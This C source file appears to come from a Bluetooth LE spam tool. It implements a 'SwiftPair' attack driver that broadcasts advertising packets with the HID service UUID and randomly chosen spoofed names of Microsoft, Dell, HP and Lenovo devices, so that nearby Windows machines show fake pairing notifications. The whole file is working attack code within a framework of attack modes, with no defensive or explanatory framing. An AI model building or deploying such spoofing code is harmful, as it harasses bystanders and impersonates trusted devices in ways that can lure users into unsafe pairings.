#include "ble_spam.h"
#include <string.h>

// =============================================================================
// Microsoft SwiftPair 協議
// =============================================================================
// SwiftPair 是 Microsoft 的藍牙快速配對通知功能
// 當 Windows 設備附近有可配對的藍牙設備時，會彈出通知
//
// SwiftPair 使用 HID Service (0x1812) 進行廣播
// 當設備廣播這個 Service UUID 時，Windows 10/11 會彈出配對通知
//
// 參考: https://learn.microsoft.com/en-us/windows-hardware/design/component-guidelines/bluetooth-swift-pair
// =============================================================================

// =============================================================================
// SwiftPair 設備名稱列表
// =============================================================================
static const char* g_swiftpair_devices[] = {
    "Surface Earbuds",
    "Surface Headphones 2",
    "Surface Headphones",
    "Surface Arc Mouse",
    "Microsoft Bluetooth Mouse",
    "Microsoft Designer Compact Keyboard",
    "Microsoft Number Pad",
    "Microsoft Ergonomic Mouse",
    "Microsoft Precision Mouse",
    "Dell WD19TW Dock",
    "Dell DA300 Adapter",
    "HP Thunderbolt Dock G4",
    "Lenovo ThinkPad USB-C Dock",
    "Generic Bluetooth Audio",
    "Generic Bluetooth Keyboard",
    "Generic Bluetooth Mouse",
    "USB Bluetooth Adapter",
};

// =============================================================================
// SwiftPair BLE 廣播格式
// =============================================================================
// SwiftPair 主要依賴 Service UUID 發現機制
// Windows 會監聽 0x1812 (HID Service) 的廣播
//
// 廣播格式:
//   Flags AD Structure (0x02 0x01 0x06)
//   Service UUID AD Structure (0x03 0x03 0x12 0x18)
//   Device Name AD Structure (0x09 ...)
//
// 注意: SwiftPair 的關鍵是正確的 Service UUID，設備名稱用於顯示
// =============================================================================

static uint8_t swiftpair_build_packet(uint8_t* _size, uint8_t** _packet, AttackConfig* config) {
    SwiftpairCfg* cfg = &config->config.swiftpair;
    
    // 選擇設備名稱
    const char* device_name;
    if(config->mode == AttackMode_Random || config->mode == AttackMode_Single) {
        uint8_t idx = rand() % (sizeof(g_swiftpair_devices) / sizeof(g_swiftpair_devices[0]));
        device_name = g_swiftpair_devices[idx];
    } else {
        device_name = cfg->name;
    }
    
    size_t name_len = strlen(device_name);
    
    // 構建數據包
    // 格式: Flags + Service UUID + Device Name
    uint8_t total_size = 3 + 3 + 1 + 1 + name_len;
    uint8_t* packet = malloc(total_size);
    uint8_t i = 0;
    
    // Flags
    packet[i++] = 0x02;  // Length
    packet[i++] = 0x01;  // AD Type: Flags
    packet[i++] = 0x06;  // Flags (General Discoverable + BR/EDR + LE)
    
    // Service UUID (HID Service 0x1812)
    packet[i++] = 0x03;  // Length
    packet[i++] = 0x03;  // AD Type: Complete List of 16-bit Service UUIDs
    packet[i++] = 0x12;  // UUID low (0x1812)
    packet[i++] = 0x18;  // UUID high
    
    // Device Name
    packet[i++] = 1 + name_len;  // Length
    packet[i++] = 0x09;           // AD Type: Complete Local Name
    memcpy(&packet[i], device_name, name_len);
    i += name_len;
    
    *_size = i;
    *_packet = packet;
    return i;
}

// =============================================================================
// 獲取設備名稱
// =============================================================================
static const char* swiftpair_get_name(uint32_t index) {
    if(index >= sizeof(g_swiftpair_devices) / sizeof(g_swiftpair_devices[0])) {
        return "Unknown";
    }
    return g_swiftpair_devices[index];
}

static uint32_t swiftpair_get_count(void) {
    return sizeof(g_swiftpair_devices) / sizeof(g_swiftpair_devices[0]);
}

// =============================================================================
// 協議驅動
// =============================================================================
const ProtocolDriver g_protocol_swiftpair = {
    .name = "Microsoft SwiftPair",
    .short_name = "SwiftPair",
    .is_active = true,
    .build_packet = swiftpair_build_packet,
    .get_device_name = swiftpair_get_name,
    .get_device_count = swiftpair_get_count,
    .init = NULL,
    .deinit = NULL,
};